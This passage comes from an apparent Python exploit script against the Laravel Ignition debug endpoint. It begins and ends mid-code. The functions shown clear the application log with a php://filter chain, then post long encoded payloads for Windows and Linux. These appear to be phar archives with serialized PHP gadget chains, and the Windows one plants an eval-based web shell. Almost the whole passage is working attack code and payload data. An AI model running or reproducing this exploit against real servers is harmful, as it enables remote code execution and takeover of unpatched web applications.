\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def AA(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"AA\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def sendpayloadwindows(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=2F=00=42=00=77=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6F=00=42=00=77=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=44=00=45=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=58=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=6C=00=63=00=33=00=4E=00=70=00=62=00=32=00=35=00=66=00=63=00=33=00=52=00=68=00=63=00=6E=00=51=00=6F=00=4B=00=54=00=74=00=41=00=63=00=32=00=56=00=30=00=58=00=33=00=52=00=70=00=62=00=57=00=56=00=66=00=62=00=47=00=6C=00=74=00=61=00=58=00=51=00=6F=00=4D=00=43=00=6B=00=37=00=51=00=47=00=56=00=79=00=63=00=6D=00=39=00=79=00=58=00=33=00=4A=00=6C=00=63=00=47=00=39=00=79=00=64=00=47=00=6C=00=75=00=5A=00=79=00=67=00=77=00=4B=00=54=00=74=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=46=00=4B=00=46=00=34=00=6B=00=52=00=43=00=78=00=65=00=4A=00=45=00=73=00=70=00=65=00=32=00=5A=00=76=00=63=00=69=00=68=00=65=00=4A=00=47=00=6B=00=39=00=4D=00=44=00=74=00=65=00=4A=00=47=00=6C=00=65=00=50=00=48=00=4E=00=30=00=63=00=6D=00=78=00=6C=00=62=00=69=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=31=00=34=00=6B=00=61=00=53=00=73=00=72=00=4B=00=53=00=42=00=37=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=30=00=67=00=50=00=53=00=42=00=65=00=4A=00=45=00=52=00=62=00=58=00=69=00=52=00=70=00=58=00=56=00=35=00=65=00=58=00=69=00=52=00=4C=00=57=00=31=00=34=00=6B=00=61=00=53=00=73=00=78=00=58=00=69=00=59=00=78=00=4E=00=56=00=30=00=37=00=66=00=58=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=65=00=4A=00=45=00=51=00=37=00=66=00=57=00=5A=00=31=00=62=00=6D=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=46=00=45=00=6F=00=58=00=69=00=52=00=45=00=4B=00=58=00=74=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=58=00=32=00=56=00=75=00=59=00=32=00=39=00=6B=00=5A=00=53=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=50=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6B=00=5A=00=57=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=58=00=69=00=52=00=51=00=50=00=53=00=64=00=77=00=59=00=58=00=4E=00=7A=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=59=00=39=00=4A=00=33=00=42=00=68=00=65=00=57=00=78=00=76=00=59=00=57=00=51=00=6E=00=4F=00=31=00=34=00=6B=00=56=00=44=00=30=00=6E=00=4D=00=32=00=4D=00=32=00=5A=00=54=00=42=00=69=00=4F=00=47=00=45=00=35=00=59=00=7A=00=45=00=31=00=4D=00=6A=00=49=00=30=00=59=00=53=00=63=00=37=00=61=00=57=00=59=00=67=00=4B=00=47=00=6C=00=7A=00=63=00=32=00=56=00=30=00=4B=00=46=00=34=00=6B=00=58=00=31=00=42=00=50=00=55=00=31=00=52=00=62=00=58=00=69=00=52=00=51=00=58=00=53=00=6B=00=70=00=65=00=31=00=34=00=6B=00=52=00=6A=00=31=00=50=00=4B=00=45=00=55=00=6F=00=54=00=79=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=77=00=39=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4F=00=31=00=34=00=6B=00=51=00=54=00=31=00=6C=00=65=00=48=00=42=00=73=00=62=00=32=00=52=00=6C=00=4B=00=43=00=64=00=65=00=66=00=43=00=63=00=73=00=58=00=69=00=52=00=4D=00=4B=00=54=00=74=00=6A=00=62=00=47=00=46=00=7A=00=63=00=79=00=42=00=44=00=65=00=33=00=42=00=31=00=59=00=6D=00=78=00=70=00=59=00=79=00=42=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=48=00=41=00=70=00=49=00=48=00=74=00=6C=00=64=00=6D=00=46=00=73=00=4B=00=46=00=34=00=6B=00=63=00=43=00=34=00=69=00=49=00=69=00=6B=00=37=00=66=00=58=00=31=00=65=00=4A=00=46=00=49=00=39=00=62=00=6D=00=56=00=33=00=49=00=45=00=4D=00=6F=00=4B=00=54=00=74=00=65=00=4A=00=46=00=49=00=74=00=58=00=6A=00=35=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=45=00=46=00=62=00=4D=00=46=00=30=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=77=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=45=00=6F=00=52=00=53=00=68=00=41=00=63=00=6E=00=56=00=75=00=4B=00=46=00=34=00=6B=00=52=00=69=00=6B=00=73=00=58=00=69=00=52=00=55=00=4B=00=53=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=7A=00=64=00=57=00=4A=00=7A=00=64=00=48=00=49=00=6F=00=62=00=57=00=51=00=31=00=4B=00=46=00=34=00=6B=00=55=00=43=00=35=00=65=00=4A=00=46=00=51=00=70=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=39=00=5A=00=57=00=78=00=7A=00=5A=00=58=00=74=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=39=00=58=00=69=00=52=00=47=00=4F=00=33=00=31=00=39=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=51=00=78=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=34=00=38=00=50=00=33=00=42=00=6F=00=63=00=43=00=42=00=7A=00=5A=00=58=00=4E=00=7A=00=61=00=57=00=39=00=75=00=58=00=33=00=4E=00=30=00=59=00=58=00=4A=00=30=00=4B=00=43=00=6B=00=37=00=51=00=48=00=4E=00=6C=00=64=00=46=00=39=00=30=00=61=00=57=00=31=00=6C=00=58=00=32=00=78=00=70=00=62=00=57=00=6C=00=30=00=4B=00=44=00=41=00=70=00=4F=00=30=00=42=00=6C=00=63=00=6E=00=4A=00=76=00=63=00=6C=00=39=00=79=00=5A=00=58=00=42=00=76=00=63=00=6E=00=52=00=70=00=62=00=6D=00=63=00=6F=00=4D=00=43=00=6B=00=37=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=52=00=53=00=68=00=65=00=4A=00=45=00=51=00=73=00=58=00=69=00=52=00=4C=00=4B=00=58=00=74=00=6D=00=62=00=33=00=49=00=6F=00=58=00=69=00=52=00=70=00=50=00=54=00=41=00=37=00=58=00=69=00=52=00=70=00=58=00=6A=00=78=00=7A=00=64=00=48=00=4A=00=73=00=5A=00=57=00=34=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4B=00=79=00=6B=00=67=00=65=00=31=00=34=00=6B=00=52=00=46=00=74=00=65=00=4A=00=47=00=6C=00=64=00=49=00=44=00=30=00=67=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=31=00=65=00=58=00=6C=00=34=00=6B=00=53=00=31=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4D=00=56=00=34=00=6D=00=4D=00=54=00=56=00=64=00=4F=00=33=00=31=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=58=00=69=00=52=00=45=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=52=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6C=00=62=00=6D=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=54=00=79=00=68=00=65=00=4A=00=45=00=51=00=70=00=65=00=33=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=69=00=59=00=58=00=4E=00=6C=00=4E=00=6A=00=52=00=66=00=5A=00=47=00=56=00=6A=00=62=00=32=00=52=00=6C=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6B=00=37=00=66=00=56=00=34=00=6B=00=55=00=44=00=30=00=6E=00=63=00=47=00=46=00=7A=00=63=00=79=00=63=00=37=00=58=00=69=00=52=00=57=00=50=00=53=00=64=00=77=00=59=00=58=00=6C=00=73=00=62=00=32=00=46=00=6B=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=51=00=39=00=4A=00=7A=00=4E=00=6A=00=4E=00=6D=00=55=00=77=00=59=00=6A=00=68=00=68=00=4F=00=57=00=4D=00=78=00=4E=00=54=00=49=00=79=00=4E=00=47=00=45=00=6E=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=59=00=39=00=54=00=79=00=68=00=46=00=4B=00=45=00=38=00=6F=00=58=00=69=00=52=00=66=00=55=00=45=00=39=00=54=00=56=00=46=00=74=00=65=00=4A=00=46=00=42=00=64=00=4B=00=53=00=78=00=65=00=4A=00=46=00=51=00=70=00=4B=00=54=00=74=00=70=00=5A=00=69=00=41=00=6F=00=61=00=58=00=4E=00=7A=00=5A=00=58=00=51=00=6F=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4B=00=53=00=6C=00=37=00=58=00=69=00=52=00=4D=00=50=00=56=00=34=00=6B=00=58=00=31=00=4E=00=46=00=55=00=31=00=4E=00=4A=00=54=00=30=00=35=00=62=00=58=00=69=00=52=00=57=00=58=00=54=00=74=00=65=00=4A=00=45=00=45=00=39=00=5A=00=58=00=68=00=77=00=62=00=47=00=39=00=6B=00=5A=00=53=00=67=00=6E=00=58=00=6E=00=77=00=6E=00=4C=00=46=00=34=00=6B=00=54=00=43=00=6B=00=37=00=59=00=32=00=78=00=68=00=63=00=33=00=4D=00=67=00=51=00=33=00=74=00=77=00=64=00=57=00=4A=00=73=00=61=00=57=00=4D=00=67=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=77=00=4B=00=53=00=42=00=37=00=5A=00=58=00=5A=00=68=00=62=00=43=00=68=00=65=00=4A=00=48=00=41=00=75=00=49=00=69=00=49=00=70=00=4F=00=33=00=31=00=39=00=58=00=69=00=52=00=53=00=50=00=57=00=35=00=6C=00=64=00=79=00=42=00=44=00=4B=00=43=00=6B=00=37=00=58=00=69=00=52=00=53=00=4C=00=56=00=34=00=2B=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=42=00=57=00=7A=00=42=00=64=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=48=00=4E=00=31=00=59=00=6E=00=4E=00=30=00=63=00=69=00=68=00=74=00=5A=00=44=00=55=00=6F=00=58=00=69=00=52=00=51=00=4C=00=6C=00=34=00=6B=00=56=00=43=00=6B=00=73=00=4D=00=43=00=77=00=78=00=4E=00=69=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=52=00=4B=00=45=00=55=00=6F=00=51=00=48=00=4A=00=31=00=62=00=69=00=68=00=65=00=4A=00=45=00=59=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=78=00=4E=00=69=00=6B=00=37=00=66=00=57=00=56=00=73=00=63=00=32=00=56=00=37=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=50=00=56=00=34=00=6B=00=52=00=6A=00=74=00=39=00=66=00=53=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=76=00=35=00=4F=00=50=00=6D=00=31=00=45=00=6C=00=61=00=48=00=76=00=4D=00=42=00=6E=00=46=00=53=00=54=00=2F=00=6E=00=53=00=36=00=54=00=2B=00=75=00=46=00=69=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def sendpayloadlinux(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=39=00=43=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=6D=00=43=00=41=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=34=00=4D=00=44=00=41=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=55=00=45=00=51=00=35=00=64=00=32=00=46=00=49=00=51=00=57=00=64=00=4A=00=53=00=45=00=35=00=73=00=59=00=7A=00=4E=00=4F=00=63=00=47=00=49=00=79=00=4E=00=57=00=5A=00=6A=00=4D=00=31=00=4A=00=6F=00=59=00=32=00=35=00=52=00=62=00=30=00=74=00=55=00=64=00=45=00=46=00=6A=00=4D=00=6C=00=59=00=77=00=57=00=44=00=4E=00=53=00=63=00=47=00=4A=00=58=00=56=00=6D=00=5A=00=69=00=52=00=32=00=78=00=30=00=59=00=56=00=68=00=52=00=62=00=30=00=31=00=44=00=61=00=7A=00=64=00=52=00=52=00=31=00=5A=00=35=00=59=00=32=00=30=00=35=00=65=00=56=00=67=00=7A=00=53=00=6D=00=78=00=6A=00=52=00=7A=00=6C=00=35=00=5A=00=45=00=64=00=73=00=64=00=56=00=70=00=35=00=5A=00=33=00=64=00=4C=00=56=00=48=00=52=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=47=00=53=00=30=00=4E=00=53=00=52=00=55=00=78=00=44=00=55=00=6B=00=78=00=4C=00=57=00=48=00=52=00=74=00=59=00=6A=00=4E=00=4A=00=62=00=30=00=70=00=48=00=61=00=7A=00=6C=00=4A=00=52=00=45=00=46=00=6E=00=54=00=33=00=6C=00=53=00=63=00=46=00=42=00=49=00=54=00=6A=00=42=00=6A=00=62=00=58=00=68=00=73=00=59=00=6D=00=6C=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=4B=00=52=00=32=00=74=00=79=00=53=00=33=00=6C=00=73=00=4E=00=30=00=70=00=46=00=55=00=6D=00=4A=00=4B=00=52=00=32=00=78=00=6B=00=55=00=46=00=4E=00=53=00=52=00=56=00=64=00=35=00=55=00=6E=00=42=00=59=00=56=00=6A=00=52=00=72=00=55=00=7A=00=46=00=7A=00=61=00=32=00=46=00=54=00=63=00=32=00=64=00=4E=00=55=00=30=00=46=00=74=00=53=00=55=00=52=00=46=00=4D=00=55=00=6C=00=47=00=4D=00=44=00=64=00=6D=00=57=00=45=00=70=00=7